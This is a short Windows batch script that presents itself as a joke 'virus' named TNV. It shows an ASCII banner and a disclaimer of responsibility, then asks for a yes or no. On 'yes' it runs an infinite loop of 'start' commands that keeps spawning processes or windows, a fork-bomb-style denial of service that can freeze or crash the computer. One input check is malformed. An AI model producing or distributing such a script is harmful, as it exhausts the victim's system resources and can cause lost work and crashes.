@echo off
:colors
:no
echo TNV Almost Harmless Virus
echo                _________________    ___        ___   __          __  
echo               /_____      ______/  /   \      /  /   \ \        / /  
echo                    /     /        /     \    /  /     \ \      / /   
echo                   /     /        /   /\  \  /  /       \ \    / /   
color 4

echo                  /     /        /   /  \  \/  /         \ \  / /
echo                 /     /        /   /    \    /           \ \/ /
echo                /_____/        /___/      \__/             \__/ 
echo im not responsible of what damages can the "TNV" do
echo Do you want to continue? (yes or no)
title = TNV
color 1
set /p input=
if /i %input%==yes goto loop
if /i %input%==no goto no
if /i not %input== yes,no goto colors


color 4
:loop
start TNV
start tottaly 
start not 
start virus 
start TNV 
start tottaly 
start not 
start virus 
start TNV 
start tottaly 
start not 
start virus 
start tottaly 
start TNV 
start TNV 
start TNV
goto loop
